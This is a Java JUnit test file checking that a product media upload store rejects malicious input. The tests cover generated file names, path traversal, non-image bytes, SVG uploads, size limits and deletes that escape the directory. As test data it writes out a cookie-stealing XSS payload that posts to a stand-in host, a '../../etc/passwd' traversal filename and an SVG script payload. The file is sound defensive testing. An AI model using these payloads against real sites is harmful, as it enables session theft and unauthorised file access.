// src/test/java/com/clickkart/product/serviceImpl/LocalDiskMediaStorageTest.java
package com.clickkart.product.serviceImpl;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.clickkart.product.config.ProductProperties;
import com.clickkart.product.service.MediaStorage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.awt.image.BufferedImage;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.UUID;
import javax.imageio.ImageIO;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/**
 * An upload endpoint is the largest piece of attacker-controlled input this service takes, so these
 * are mostly about what it refuses rather than what it accepts.
 */
class LocalDiskMediaStorageTest {

    private Path directory;
    private LocalDiskMediaStorage storage;

    @BeforeEach
    void setUp() throws IOException {
        directory = Files.createTempDirectory("ck-media-test");
        ProductProperties properties = new ProductProperties();
        properties.setMediaDirectory(directory.toString());
        properties.setMediaBaseUrl("/api/v1/products/media");
        properties.setMaxMediaBytes(1024L * 1024);
        storage = new LocalDiskMediaStorage(properties);
    }

    @AfterEach
    void tearDown() throws IOException {
        try (var walk = Files.walk(directory)) {
            walk.sorted(java.util.Comparator.reverseOrder()).forEach(path -> {
                try {
                    Files.deleteIfExists(path);
                } catch (IOException ignored) {
                    // Temp directory; a leftover file fails nothing.
                }
            });
        }
    }

    /** A real PNG, so the magic bytes and the header dimensions are genuine. */
    private static byte[] png(int width, int height) throws IOException {
        BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ImageIO.write(image, "png", out);
        return out.toByteArray();
    }

    @Test
    void storesAGenuineImageAndReadsItsDimensionsFromTheHeader() throws IOException {
        MediaStorage.StoredMedia stored = storage.store(png(800, 800), "photo.png", "image/png");

        assertThat(stored.contentType()).isEqualTo("image/png");
        assertThat(stored.widthPx()).isEqualTo(800);
        assertThat(stored.heightPx()).isEqualTo(800);
        assertThat(stored.url()).startsWith("/api/v1/products/media/");
    }

    @Test
    void neverUsesTheNameTheBrowserSent() throws IOException {
        MediaStorage.StoredMedia stored = storage.store(png(64, 64), "photo.png", "image/png");

        // The stored name is generated. This is what makes a filename containing ../ inert: it
        // never reaches the filesystem at all.
        assertThat(stored.url()).doesNotContain("photo");
        String name = stored.url().substring(stored.url().lastIndexOf('/') + 1);
        assertThat(name).matches("^[0-9a-f-]{36}\\.png$");
    }

    @Test
    void aTraversingFilenameCannotEscapeTheDirectory() throws IOException {
        MediaStorage.StoredMedia stored =
                storage.store(png(64, 64), "../../../../etc/passwd.png", "image/png");

        String name = stored.url().substring(stored.url().lastIndexOf('/') + 1);
        assertThat(Files.exists(directory.resolve(name))).isTrue();
        // Everything written landed inside the directory, and there is exactly one thing.
        try (var list = Files.list(directory)) {
            assertThat(list.count()).isEqualTo(1);
        }
    }

    @Test
    void refusesAFileWhoseBytesAreNotMediaHoweverItIsLabelled() {
        byte[] script = "<script>fetch('https://example.invalid/'+document.cookie)</script>"
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);

        // Content-Type is whatever the client says. Believing it is how a stored-XSS payload ends up
        // being served back from our own origin to every customer who opens the listing.
        assertThatThrownBy(() -> storage.store(script, "photo.png", "image/png"))
                .isInstanceOf(MediaStorage.MediaRejectedException.class)
                .hasMessageContaining("not a JPEG");
    }

    @Test
    void refusesAnSvgEvenThoughItIsAnImageFormat() {
        byte[] svg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);

        // SVG is a document that executes script in the browsers that render it. Served from our
        // origin it is stored XSS, which is why it is not on the allow-list at all.
        assertThatThrownBy(() -> storage.store(svg, "logo.svg", "image/svg+xml"))
                .isInstanceOf(MediaStorage.MediaRejectedException.class);
    }

    @Test
    void refusesAFileOverTheSizeLimit() {
        byte[] tooBig = new byte[(int) (1024L * 1024) + 1];
        // Magic bytes of a PNG, so it fails on size rather than on type.
        tooBig[0] = (byte) 0x89;
        tooBig[1] = 'P';
        tooBig[2] = 'N';
        tooBig[3] = 'G';

        assertThatThrownBy(() -> storage.store(tooBig, "huge.png", "image/png"))
                .isInstanceOf(MediaStorage.MediaRejectedException.class)
                .hasMessageContaining("larger than");
    }

    @Test
    void refusesAnEmptyFileRatherThanStoringNothing() {
        assertThatThrownBy(() -> storage.store(new byte[0], "empty.png", "image/png"))
                .isInstanceOf(MediaStorage.MediaRejectedException.class)
                .hasMessageContaining("empty");
    }

    @Test
    void deletingByANameThatDidNotComeFromThisStoreIsRefused() throws IOException {
        Path outside = directory.getParent().resolve("ck-not-ours-" + UUID.randomUUID() + ".txt");
        Files.writeString(outside, "keep me");
        try {
            storage.delete("/api/v1/products/media/../" + outside.getFileName());
            assertThat(Files.exists(outside)).isTrue();
        } finally {
            Files.deleteIfExists(outside);
        }
    }

    @Test
    void deletingSomethingAlreadyGoneIsNotAnError() {
        // Deletion is idempotent: a retry after a partial failure must not fail the second time.
        storage.delete("/api/v1/products/media/" + UUID.randomUUID() + ".png");
    }
}
